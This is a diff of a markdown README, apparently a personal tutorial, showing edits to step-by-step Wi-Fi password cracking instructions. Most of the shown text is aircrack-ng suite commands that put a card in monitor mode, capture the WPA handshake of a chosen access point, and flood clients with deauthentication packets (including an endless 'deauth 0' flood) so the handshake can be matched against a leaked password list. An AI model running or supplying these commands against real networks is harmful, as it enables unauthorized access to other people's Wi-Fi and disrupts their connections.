@@ -46,34 +46,24 @@ When the client connects back, we capture the 4-way handshake packets EAPOL Pack
 
 We dont need to decrypt this, rather we just need to match with the leaked password list and get the wifi password !! 
 
-## Steps to get the certificate
+## Steps to get the AES encrypted certificate / password
 
 * Change to Monitor Mode : `sudo airmon-ng start wlo1`
  
-* Scan the wifi : `sudo iwlist scan`
+* Scan the wifi : `sudo airodump-ng --write scan --output-format csv`
 
-* Top networks
-```
-sudo airdump-ng start wlo1mon , or , 
-sudo airodump-ng wlo1mon --write scan --output-format csv
-```
-* Set the channel to capture : `sudo iw dev wlo1mon set channel 1`
+* Find the relevant BSSID and the channel that you need to crack
 
-* Get all wifi present and bssid : `sudo iw dev wlo1 scan`
-
-* Get into monitor mode : `sudo airmon-ng start wlo1`
-
-* Manager mode : `sudo airmon-ng stop wlo1mon`
-
-* Airodump : `sudo airodump-ng --bssid <bssid> -c <channel-name> -w capture wlo1mon`
+* Check that particular bssid : `sudo airodump-ng wlo1mon -d <bssid>` 
 
 To check how many beacons you have passed and see if any relevant signal has been catched or not !!
-* sudo airodump-ng -w '<hack2>' -c '<1>' --bssid '<A8:DA:0C:BD:0B:57>' wlo1mon
+* sudo airodump-ng -w <hack2> -c <1> --bssid <A8:DA:0C:BD:0B:57> wlo1mon
 
-* Send deauth request at scale : `sudo aireplay-ng --deauth 0 -a <48:22:54:4C:CA:18> wlo1mon`
-OR  
-`sudo aireplay-ng --deauth 20 -a 6c:4f:89:9a:3f:af wlo1mon --ignore-negative-one`
+Then parallely check for this :  
+* Send deauth request at scale : `sudo aireplay-ng --deauth 0 -a <48:22:54:4C:CA:18> wlo1mon` OR `sudo aireplay-ng --deauth 20 -a 6c:4f:89:9a:3f:af wlo1mon --ignore-negative-one`
 
+Stop the manager mode : 
+* Manager mode : `sudo airmon-ng stop wlo1mon`
 
 ![hacked](https://github.com/user-attachments/assets/8ab726b5-c6b8-43e9-b184-a7207d1f3163)
 
